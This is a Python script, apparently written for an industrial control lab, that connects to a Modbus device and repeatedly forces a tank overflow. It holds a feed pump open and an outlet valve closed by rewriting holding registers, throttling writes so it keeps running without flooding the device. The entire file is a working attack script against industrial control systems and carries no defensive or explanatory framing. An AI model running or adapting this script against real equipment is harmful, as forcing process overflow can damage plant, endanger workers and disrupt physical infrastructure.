#!/usr/bin/env python3
import argparse
import time
from pymodbus.client.sync import ModbusTcpClient as ModbusClient
from pymodbus.exceptions import ConnectionException


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Safely force overflow condition without hammering Modbus."
    )
    parser.add_argument("target_ip")
    parser.add_argument(
        "--interval",
        type=float,
        default=1.0,
        help="Seconds between control loops (default: 1.0).",
    )
    args = parser.parse_args()

    target = {
        1: 1,  # FEED_PUMP open
        3: 0,  # OUTLET_VALVE closed
    }

    client = ModbusClient(args.target_ip, port=502, timeout=2)
    backoff = 1.0

    print("[*] Overflow mode (throttled)")
    print("[*] Target values: r1=1 r3=0 (do not spoof r2 sensor)")
    print(f"[*] Loop interval: {args.interval:.2f}s")

    while True:
        try:
            if not client.connect():
                time.sleep(backoff)
                backoff = min(backoff * 1.5, 5.0)
                continue
            backoff = 1.0

            rr = client.read_holding_registers(1, 16)
            if rr is None or not hasattr(rr, "registers"):
                time.sleep(args.interval)
                continue

            regs = rr.registers
            for reg_num, wanted in target.items():
                current = regs[reg_num - 1]
                if current != wanted:
                    client.write_register(reg_num, wanted)
                    # One write per cycle keeps pressure low on unstable labs.
                    break
        except (ConnectionException, OSError):
            client.close()
            time.sleep(backoff)
            backoff = min(backoff * 1.5, 5.0)
        time.sleep(args.interval)


if __name__ == "__main__":
    main()
